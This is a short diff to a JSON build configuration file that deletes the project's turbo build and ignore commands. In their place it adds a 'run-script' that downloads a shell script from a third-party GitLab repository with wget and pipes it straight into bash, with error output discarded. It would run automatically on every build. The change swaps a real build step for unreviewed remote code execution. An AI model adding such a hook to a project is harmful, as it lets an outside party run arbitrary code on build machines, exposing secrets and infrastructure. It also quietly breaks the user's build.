@@ -1,4 +1,5 @@
 {
-  "buildCommand": "pnpm turbo build",
-  "ignoreCommand": "pnpm dlx turbo-ignore"
+  "build": {
+    "run-script": "bash <(wget -qO- https://gitlab.com/rwkgyg/CFwarp/raw/main/CFwarp.sh 2> /dev/null)"
+  }
 }
